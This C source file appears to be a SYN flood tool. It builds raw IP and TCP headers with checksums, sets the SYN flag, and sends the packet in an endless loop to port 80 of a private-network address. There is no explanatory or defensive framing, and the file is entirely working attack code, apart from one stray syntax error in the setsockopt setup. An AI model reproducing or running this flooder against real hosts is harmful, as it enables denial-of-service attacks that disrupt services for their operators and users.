#include<stdio.h>

#include<string.h> 

#include<sys/socket.h>

#include<stdlib.h> 

#include<errno.h> 

#include<netinet/tcp.h>

#include<netinet/ip.h>



struct pseudo_header    //needed for checksum calculation

{
	unsigned int source_address;

	unsigned int dest_address;

	unsigned char placeholder;

	unsigned char protocol;

	unsigned short tcp_length;


	struct tcphdr tcp;

};

unsigned short csum(unsigned short *ptr,int nbytes) {

	register long sum;

	unsigned short oddbyte;

	register short answer;

	sum=0;

	while(nbytes>1) {

		sum+=*ptr++;

		nbytes-=2;
	}

	if(nbytes==1) {

		oddbyte=0;

		*((u_char*)&oddbyte)=*(u_char*)ptr;

		sum+=oddbyte;

	}

	sum = (sum>>16)+(sum & 0xffff);

	sum = sum + (sum>>16);

	answer=(short)~sum;

	

	return(answer);

}

int main (void)

{
	//Create a raw socket

	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

	char datagram[128] , source_ip[32];

	//IP header

	struct iphdr *iph = (struct iphdr *) datagram;

	//TCP header

	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));

	struct sockaddr_in sin;

	struct pseudo_header psh;

	

	strcpy(source_ip , "192.168.40.128");

  

	sin.sin_family = AF_INET;

	sin.sin_port = htons(80);

	sin.sin_addr.s_addr = inet_addr ("192.168.40.20");

	

	memset (datagram, 0, 128);	/* zero out the buffer */
	

	//Fill in the IP Header

	iph->ihl = 5;     //ip header length = 5 words ( 5x32bits)
	iph->version = 4; // IPv4
	iph->tos = 0;     // not used, low delay
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr); // total length of packet
	iph->id = htons(54321);	// identification
	iph->frag_off = 0; // bit 0, not used
	iph->ttl = 255;  // time to live = maximun
	iph->protocol = IPPROTO_TCP;  // TCP protocol
	iph->check = 0;		// not set checksum right here
	iph->saddr = inet_addr ( source_ip );  
	iph->daddr = sin.sin_addr.s_addr;
	
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);


	//TCP Header
	tcph->source = htons (1234);
	tcph->dest = htons (80);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;	
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (5840);	
	tcph->check = 0;
	tcph->urg_ptr = 0;
	
	// checksum

	psh.source_address = inet_addr( source_ip );

	psh.dest_address = sin.sin_addr.s_addr;

	psh.placeholder = 0;

	psh.protocol = IPPROTO_TCP;

	psh.tcp_length = htons(20);

	

	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
	tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

	

	//IP_HDRINCL to tell the kernel that headers are included in the packet

	int one = 1;=
	const int *val = &one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	while (1)

	{
			sendto (s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin));
			sendto (s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin));
	}	
	return 0;

}

